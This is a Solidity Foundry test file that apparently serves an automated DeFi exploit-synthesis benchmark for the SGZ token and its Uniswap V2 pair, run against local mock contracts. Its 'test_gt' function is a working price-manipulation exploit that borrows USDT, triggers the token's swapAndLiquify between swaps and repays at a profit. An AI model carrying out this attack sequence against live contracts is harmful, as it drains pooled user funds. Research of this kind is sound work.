// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {SGZ} from "./SGZ.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract SGZTest is Test, BlockLoader {
    USDT usdt;
    SGZ sgz;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address sgzAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1657743400;
    uint112 reserve0pair = 75972570174789479868300310831021;
    uint112 reserve1pair = 90560725378390149771577;
    uint32 blockTimestampLastpair = 1657743250;
    uint256 kLastpair = 6879703568427996083107228657637381495527610347420177890;
    uint256 price0CumulativeLastpair = 1112747229828982884289307841512;
    uint256 price1CumulativeLastpair =
        5052703677740238713862095790545994450382851783111;
    uint256 totalSupplysgz = 1000000000000000000000000000000000;
    uint256 balanceOfsgzpair = 75972570174789479868300310831021;
    uint256 balanceOfsgzattacker = 0;
    uint256 balanceOfsgzsgz = 76808290040410199339350019683;
    uint256 totalSupplyusdt = 4979997922172658408539526181;
    uint256 balanceOfusdtpair = 90560725378390149771577;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtsgz = 30378842175602511050329;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        sgz = new SGZ(address(usdt));
        sgzAddr = address(sgz);
        pair = new UniswapV2Pair(
            address(sgz),
            address(usdt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(sgz), balanceOfusdtsgz);
        sgz.transfer(address(sgz), balanceOfsgzsgz);
        usdt.transfer(address(pair), balanceOfusdtpair);
        sgz.transfer(address(pair), balanceOfsgzpair);
        sgz.afterDeploy(address(router), address(pair));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(sgz), address(usdt), sgz.decimals());
        emit log_string("");
        emit log_string("Sgz Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(sgz), usdt.decimals());
        queryERC20BalanceDecimals(address(sgz), address(sgz), sgz.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(sgz), address(pair), sgz.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(sgz),
            address(attacker),
            sgz.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_sgz_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        sgz.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_sgz_owner(uint256 amount) internal eurus {
        sgz.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_sgz_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        sgz.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_sgz_pair(uint256 amount) internal eurus {
        sgz.transfer(address(pair), amount);
    }

    function swap_pair_attacker_sgz_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        sgz.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_usdt_sgz(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function addliquidity_sgz_pair_sgz_usdt() internal eurus {
        sgz.swapAndLiquifyStepv1();
        pair.sync();
    }

    function swap_pair_sgz_sgz_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        sgz.swapAndLiquify();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_sgz_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_sgz_sgz_usdt(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_sgz_sgz_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        payback_sgz_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_sgz_owner(amt0);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        payback_sgz_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_sgz_sgz_usdt(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        payback_sgz_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        payback_sgz_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_sgz_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        payback_sgz_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_sgz_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        swap_pair_attacker_usdt_sgz(amt7, amt8);
        swap_pair_attacker_sgz_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_sgz_sgz_usdt(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        swap_pair_attacker_usdt_sgz(amt7, amt8);
        swap_pair_attacker_sgz_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_sgz_sgz_usdt(amt5, amt6);
        swap_pair_attacker_usdt_sgz(amt7, amt8);
        swap_pair_attacker_sgz_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        swap_pair_sgz_sgz_usdt(amt7, amt8);
        swap_pair_attacker_sgz_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        swap_pair_sgz_sgz_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        swap_pair_attacker_usdt_sgz(amt7, amt8);
        payback_sgz_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_sgz_owner(amt0);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        swap_pair_attacker_usdt_sgz(amt7, amt8);
        payback_sgz_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_sgz_sgz_usdt(amt1, amt2);
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        swap_pair_attacker_usdt_sgz(amt9, amt10);
        payback_sgz_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        swap_pair_attacker_usdt_sgz(amt7, amt8);
        payback_sgz_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_sgz_sgz_usdt(amt3, amt4);
        swap_pair_attacker_usdt_sgz(amt5, amt6);
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        swap_pair_attacker_usdt_sgz(amt9, amt10);
        payback_sgz_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        swap_pair_attacker_usdt_sgz(amt7, amt8);
        payback_sgz_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        swap_pair_sgz_sgz_usdt(amt5, amt6);
        swap_pair_attacker_sgz_usdt(amt7, amt8);
        swap_pair_attacker_usdt_sgz(amt9, amt10);
        payback_sgz_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_usdt_sgz(amt7, amt8);
        payback_sgz_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_sgz_owner(amt0);
        swap_pair_attacker_sgz_usdt(amt1, amt2);
        swap_pair_attacker_usdt_sgz(amt3, amt4);
        swap_pair_attacker_sgz_usdt(amt5, amt6);
        swap_pair_sgz_sgz_usdt(amt7, amt8);
        swap_pair_attacker_usdt_sgz(amt9, amt10);
        payback_sgz_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        emit log_named_uint("amt0", 100e18);
        borrow_usdt_owner(100e18);
        printBalance("After step0 ");
        emit log_named_uint("amt1", usdt.balanceOf(attacker));
        emit log_named_uint(
            "amt2",
            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
        );
        swap_pair_attacker_usdt_sgz(
            usdt.balanceOf(attacker),
            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
        );
        printBalance("After step1 ");
        addliquidity_sgz_pair_sgz_usdt();
        printBalance("After step2 ");
        emit log_named_uint("amt3", sgz.balanceOf(attacker));
        emit log_named_uint(
            "amt4",
            pair.getAmountOut(sgz.balanceOf(attacker), address(sgz))
        );
        swap_pair_attacker_sgz_usdt(
            sgz.balanceOf(attacker),
            pair.getAmountOut(sgz.balanceOf(attacker), address(sgz))
        );
        printBalance("After step3 ");
        emit log_named_uint("amt5", (100e18 * 1003) / 1000);
        payback_usdt_owner((100e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_sgz(amt1, amt2);
        addliquidity_sgz_pair_sgz_usdt();
        swap_pair_attacker_sgz_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }
}
